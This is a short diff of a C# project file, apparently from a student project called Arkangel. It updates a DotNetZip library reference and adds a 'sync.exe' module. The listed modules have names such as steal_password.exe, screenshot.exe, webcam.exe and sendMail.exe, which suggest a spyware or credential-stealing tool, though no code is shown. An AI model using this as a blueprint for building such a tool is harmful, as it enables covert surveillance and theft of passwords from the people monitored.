@@ -54,8 +54,8 @@
     <ApplicationManifest>app.manifest</ApplicationManifest>
   </PropertyGroup>
   <ItemGroup>
-    <Reference Include="DotNetZip">
-      <HintPath>D:\01.Students\01.School\term06\DoAnChuyenNganh\APP\Arkangel_ver02_01\packages\DotNetZip.1.10.1\lib\net20\DotNetZip.dll</HintPath>
+    <Reference Include="DotNetZip, Version=1.11.0.0, Culture=neutral, PublicKeyToken=6583c7c814667745, processorArchitecture=MSIL">
+      <HintPath>..\packages\DotNetZip.1.11.0\lib\net20\DotNetZip.dll</HintPath>
     </Reference>
     <Reference Include="Dragablz, Version=0.0.3.203, Culture=neutral, processorArchitecture=MSIL">
       <HintPath>..\packages\Dragablz.0.0.3.203\lib\net45\Dragablz.dll</HintPath>
@@ -322,6 +322,7 @@
     <Content Include="module\screenshot.exe" />
     <Content Include="module\sendMail.exe" />
     <Content Include="module\steal_password.exe" />
+    <Content Include="module\sync.exe" />
     <Content Include="module\sync_up.exe" />
     <Content Include="module\webcam.exe" />
     <Content Include="module\website_usage.exe" />
